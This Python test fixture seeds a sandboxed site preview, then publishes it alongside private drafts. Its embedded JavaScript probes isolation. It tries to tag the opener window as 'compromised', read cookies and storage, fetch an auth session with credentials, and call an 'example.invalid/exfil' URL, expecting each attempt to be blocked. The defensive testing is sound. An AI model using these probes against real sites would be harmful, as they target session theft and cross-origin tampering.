"""Synthetic, non-network fixture for browser isolation checks; never production content."""

from hortator.documents import DEFAULTS
from hortator.plugins import ToolContext


HTML = """<!doctype html><html><head><meta charset="utf-8"><title>Site sandbox fixture</title>
<link rel="stylesheet" href="./style.css"></head><body>
<h1 id="fixture-heading">Published sandbox fixture</h1>
<img id="fixture-image" src="./pixel.svg" alt="Synthetic test pixel">
<script>window.fixtureInline = true;</script><script src="./classic.js"></script>
<script type="module" src="./main.js"></script></body></html>"""
MODULE = """import { value } from './module.js';
const report = {inline: window.fixtureInline === true, classic: window.fixtureClassic === true, module: value === 'module-loaded'};
const violations = [];
addEventListener('securitypolicyviolation', event => violations.push(event.blockedURI));
try { await document.querySelector('#fixture-image').decode(); report.image = true; } catch { report.image = false; }
report.css = getComputedStyle(document.querySelector('#fixture-heading')).color === 'rgb(12, 34, 56)';
try { report.data = (await (await fetch('./data.json')).json()).fixture === 'local-data'; } catch { report.data = false; }
try { report.openerBlocked = false; window.opener.document.body.dataset.compromised = 'yes'; } catch { report.openerBlocked = true; }
try { document.cookie; report.cookieBlocked = false; } catch { report.cookieBlocked = true; }
try { localStorage.getItem('anything'); report.storageBlocked = false; } catch { report.storageBlocked = true; }
for (const [name, url] of [['apiBlocked', '/api/auth/session'], ['otherSiteBlocked', '/sites/ada/other-site/data.json'], ['externalBlocked', 'https://example.invalid/exfil']]) {
  try { await fetch(url, {credentials: 'include'}); report[name] = false; } catch { report[name] = true; }
}
await new Promise(resolve => setTimeout(resolve, 50));
report.violations = violations;
report.origin = globalThis.origin;
report.openerDetached = window.opener === null;
window.fixtureReport = report;
if (window.opener) window.opener.postMessage({kind: 'site-sandbox-fixture', report}, '*');
document.body.dataset.complete = 'yes';
"""
FILES = {
    "index.html": HTML,
    "style.css": "#fixture-heading { color: rgb(12, 34, 56); }",
    "classic.js": "window.fixtureClassic = true;",
    "main.js": MODULE,
    "module.js": "export const value = 'module-loaded';",
    "data.json": '{"fixture":"local-data"}',
    "pixel.svg": '<svg xmlns="http://www.w3.org/2000/svg" width="2" height="2"><rect width="2" height="2" fill="red"/></svg>',
}


async def seed_site_preview(kernel):
    context = ToolContext(
        kernel.store.get("bots", "ada"), "222222222222222222", "site-preview-fixture", False
    )
    sites = kernel.registry.documents
    await sites.call({"operation": "create", "site": "sandbox-fixture"}, context, DEFAULTS)
    for name, content in FILES.items():
        await sites.call(
            {"operation": "write", "site": "sandbox-fixture", "path": name, "content": content},
            context,
            DEFAULTS,
        )
    await sites.call({"operation": "publish", "site": "sandbox-fixture"}, context, DEFAULTS)
    # A future draft must remain private while the published snapshot stays unchanged.
    await sites.call(
        {
            "operation": "write",
            "site": "sandbox-fixture",
            "path": "index.html",
            "content": "<h1>PRIVATE DRAFT</h1>",
        },
        context,
        DEFAULTS,
    )
    await sites.call({"operation": "create", "site": "unpublished-fixture"}, context, DEFAULTS)
    await sites.call(
        {
            "operation": "write",
            "site": "unpublished-fixture",
            "path": "index.html",
            "content": "<h1>NEVER PUBLISHED</h1>",
        },
        context,
        DEFAULTS,
    )
